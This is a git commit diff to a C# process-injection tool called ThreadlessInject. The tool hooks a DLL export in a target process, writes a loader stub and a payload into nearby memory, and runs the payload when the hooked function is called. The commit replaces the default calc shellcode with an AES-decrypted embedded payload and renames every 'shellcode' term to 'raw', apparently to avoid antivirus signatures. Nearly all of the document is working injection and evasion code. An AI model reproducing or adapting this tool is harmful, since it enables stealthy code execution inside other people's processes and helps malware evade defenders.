32c43d72ceadf193bb6edf621ffdc2bcacac5060
Weasel Sec <147257425+weaselsec@users.noreply.github.com>
2023-12-01 22:17:44 +0000

    Update Program.cs

--- ThreadlessInject/Program.cs
+++ ThreadlessInject/Program.cs
@@ -1,45 +1,70 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Threading;
 
 using Mono.Options;
 
-namespace ThreadlessInject;
 
+namespace ThreadlessInject;
 using static Native;
 using static Win32;
 
 internal static class Program
 {
-    //x64 calc shellcode function with ret as default if no shellcode supplied
-    private static readonly byte[] CalcX64 =
-    {
-        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
-        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
-        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
-        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
-        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
-        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
-        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
-        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
-        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
-    };
+    //x64 calc raw function with ret as default if no raw supplied
+    private static readonly byte[] passwordBytes = new byte[] {  };
+    private static readonly byte[] saltBytes = new byte[] {  };
+    private static readonly byte[] encryptedraw = new byte[] {  };
+    private static readonly byte[] raw_sc = Decryptraw(passwordBytes, saltBytes, encryptedraw);
 
-    private static readonly byte[] ShellcodeLoader =
+    private static readonly byte[] rawLoader =
     {
         0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
         0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
         0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
         0xE0, 0x90
     };
-    
+	
+	
+	       static byte[] Decryptraw(byte[] passwordBytes, byte[] saltBytes, byte[] raw)
+        {
+            byte[] decryptedString;
+           
+            RijndaelManaged rj = new RijndaelManaged();
+
+            try
+            {
+                rj.KeySize = 256;
+                rj.BlockSize = 128;
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                rj.Key = key.GetBytes(rj.KeySize / 8);
+                rj.IV = key.GetBytes(rj.BlockSize / 8);
+                rj.Mode = CipherMode.CBC;
+
+                MemoryStream ms = new MemoryStream(raw);
+
+                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
+                {
+                    cs.Read(raw, 0, raw.Length);
+                    decryptedString = ms.ToArray();
+                }
+            }
+            finally
+            {
+                rj.Clear();
+            }
+
+            return decryptedString;
+        }
+
     private static IntPtr GetModuleHandle(string dll)
     {
         using var self = Process.GetCurrentProcess();
-        
+
         foreach (ProcessModule module in self.Modules)
         {
             if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
@@ -47,21 +72,21 @@ internal static class Program
 
             return module.BaseAddress;
         }
-        
+
         return IntPtr.Zero;
     }
 
     private static void GenerateHook(long originalInstructions)
     {
-        // This function generates the following shellcode.
+        // This function generates the following raw.
         // The hooked function export is determined by immediately popping the return address and subtracting by 5 (size of relative call instruction)
-        // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
+        // Original function arguments are pushed onto the stack to restore after the injected raw is executed
         // The hooked function bytes are restored to the original values (essentially a one time hook)
-        // A relative function call is made to the injected shellcode that will follow immediately after the stub
+        // A relative function call is made to the injected raw that will follow immediately after the stub
         // Original function arguments are popped off the stack and restored to the correct registers
         // A jmp back to the original unpatched export restoring program behavior as normal
         // 
-        // This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
+        // This raw loader stub assumes that the injector has left the hooked function RWX to enable restoration,
         // the injector can then monitor for when the restoration has occured to restore the memory back to RX
 
         /*
@@ -79,7 +104,7 @@ internal static class Program
             17: 33 22 11
             1a: 48 89 08                mov    QWORD PTR [rax],rcx
             1d: 48 83 ec 40             sub    rsp,0x40
-            21: e8 11 00 00 00          call   shellcode
+            21: e8 11 00 00 00          call   raw
             26: 48 83 c4 40             add    rsp,0x40
             2a: 41 5b                   pop    r11
             2c: 41 5a                   pop    r10
@@ -89,10 +114,10 @@ internal static class Program
             33: 59                      pop    rcx
             34: 58                      pop    rax
             35: ff e0                   jmp    rax
-          shellcode:
+          raw:
         */
 
-        using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
+        using var writer = new BinaryWriter(new MemoryStream(rawLoader));
         //Write the original 8 bytes that were in the original export prior to hooking
         writer.Seek(0x12, SeekOrigin.Begin);
         writer.Write(originalInstructions);
@@ -126,39 +151,39 @@ internal static class Program
             return File.ReadAllBytes(path);
         }
 
-        Console.WriteLine("[=] Shellcode argument doesn't appear to be a file, assuming Base64");
+        Console.WriteLine("[=] raw argument doesn't appear to be a file, assuming Base64");
         return Convert.FromBase64String(path);
     }
 
-    private static byte[] LoadShellcode(string path)
+    private static byte[] Loadraw(string path)
     {
-        byte[] shellcode;
+        byte[] raw;
 
         if (path == null)
         {
-            Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
-            shellcode = CalcX64;
+            Console.WriteLine("[=] No raw supplied, using calc raw");
+            raw = raw_sc;
         }
         else
         {
-            shellcode = ReadPayload(path);
+            raw = ReadPayload(path);
         }
 
-        return shellcode;
+        return raw;
     }
 
     public static void Main(string[] args)
     {
         var showHelp = false;
-        string shellcodeStr = null;
+        string rawStr = null;
         string dll = null;
         string export = null;
         var pid = 0;
 
         var optionSet = new OptionSet()
             .Add("h|help", "Display this help", v => showHelp = v != null)
-            .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)",
-                v => shellcodeStr = v)
+            .Add("x=|raw=", "Path/Base64 for x64 raw payload (default: calc launcher)",
+                v => rawStr = v)
             .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
             .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
             .Add("e=|export=", "The exported function that will be hijacked", v => export = v);
@@ -216,12 +241,12 @@ internal static class Program
 
         Console.WriteLine($"[=] Opened process with id {pid}");
 
-        var shellcode = LoadShellcode(shellcodeStr);
-        
+        var raw = Loadraw(rawStr);
+
         var loaderAddress = FindMemoryHole(
             hProcess,
             (ulong)exportAddress,
-            ShellcodeLoader.Length + shellcode.Length);
+            rawLoader.Length + raw.Length);
 
         if (loaderAddress == 0)
         {
@@ -229,7 +254,7 @@ internal static class Program
             return;
         }
 
-        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");
+        Console.WriteLine($"[=] Allocated loader and raw at 0x{loaderAddress:x} within PID {pid}");
 
         var originalBytes = Marshal.ReadInt64(exportAddress);
         GenerateHook(originalBytes);
@@ -261,7 +286,7 @@ internal static class Program
             return;
         }
 
-        var payload = ShellcodeLoader.Concat(shellcode).ToArray();
+        var payload = rawLoader.Concat(raw).ToArray();
         //WriteProcessMemory(hProcess, (IntPtr)loaderAddress, payload, payload.Length, out _);
 
         status = ProtectVirtualMemory(
@@ -282,20 +307,20 @@ internal static class Program
             (IntPtr)loaderAddress,
             payload,
             out bytesWritten);
-        
+
         if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
         {
             Console.WriteLine($"[!] Failed to write payload: {status}");
             return;
         }
-        
+
         status = ProtectVirtualMemory(
             hProcess,
             (IntPtr)loaderAddress,
             (uint)payload.Length,
             oldProtect,
             out _);
-        
+
         if (status != NTSTATUS.Success)
         {
             Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
@@ -306,13 +331,13 @@ internal static class Program
         timer.Start();
         var executed = false;
 
-        Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");
+        Console.WriteLine("[+] raw injected, Waiting 60s for the hook to be called");
 
         while (timer.Elapsed.TotalSeconds < 60)
         {
             var bytesToRead = 8;
             var buf = Marshal.AllocHGlobal(bytesToRead);
-            
+
             ReadVirtualMemory(
                 hProcess,
                 exportAddress,
@@ -348,11 +373,11 @@ internal static class Program
                 hProcess,
                 (IntPtr)loaderAddress);
 
-            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
+            Console.WriteLine($"[+] raw executed after {timer.Elapsed.TotalSeconds}s, export restored");
         }
         else
         {
-            Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
+            Console.WriteLine("[!] raw did not trigger within 60s, it may still execute but we are not cleaning up");
         }
 
         CloseHandle(hProcess);
